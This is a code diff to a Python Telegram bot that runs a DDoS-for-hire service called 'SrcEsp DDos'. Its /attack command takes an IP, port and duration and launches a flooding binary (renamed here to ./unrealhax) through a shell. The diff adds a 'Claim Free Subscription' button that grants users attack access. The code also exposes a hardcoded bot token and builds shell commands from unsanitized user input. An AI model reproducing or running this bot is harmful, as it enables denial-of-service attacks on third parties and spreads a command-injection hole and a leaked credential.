@@ -1,6 +1,12 @@
 import asyncio
 from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
+from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
+from telegram.ext import CallbackContext
+from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
+from telegram.ext import CallbackContext, CallbackQueryHandler
+import os
+
 
 TELEGRAM_BOT_TOKEN = '7139376005:AAEMnQ0Iq_UgtihQ63A-Fj15Gy4D6S2EUew'
 ADMIN_USER_ID = 912866707
@@ -24,12 +30,48 @@ users = load_users()
 
 async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
+
+    # Define the welcome message text
     message = (
         "*🔥 Welcome to the SrcEsp 🔥*\n\n"
         "*Use /attack <ip> <port> <duration>*\n"
         "*Buy Private File @SrcEsp ⚔️💥*"
     )
-    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
+
+    # Define the inline button
+    keyboard = [
+        [InlineKeyboardButton("Claim Free Subscription 🎁", callback_data="claim")]
+    ]
+
+    # Create the markup for the inline button
+    reply_markup = InlineKeyboardMarkup(keyboard)
+
+    # Send the message with inline button
+    await context.bot.send_message(
+        chat_id=chat_id,
+        text=message,
+        parse_mode='Markdown',
+        reply_markup=reply_markup
+    )
+
+async def claim_button_handler(update: Update, context: CallbackContext):
+    query = update.callback_query
+    await query.answer()
+    user_id = query.from_user.id
+
+    with open('users.txt', 'a') as f:
+        f.write(f"{user_id}\n")
+        
+    global users
+    users = load_users()
+
+    await query.edit_message_text(
+        text="✅ Successfully claimed VIP! 🎉\nThank you for using SrcEsp DDos!\n*Use /attack <ip> <port> <duration>*\n",
+        parse_mode='Markdown'
+    )
+
+
+
 
 async def manage(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
@@ -58,7 +100,7 @@ async def manage(update: Update, context: CallbackContext):
 async def run_attack(chat_id, ip, port, duration, context, user_id):
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./SrcEsp {ip} {port} {duration} 10",
+            f"./unrealhax {ip} {port} {duration} 10",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
@@ -112,6 +154,7 @@ def main():
     application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("manage", manage))
+    application.add_handler(CallbackQueryHandler(claim_button_handler, pattern="claim"))
     application.add_handler(CommandHandler("attack", attack))
     application.run_polling()
 
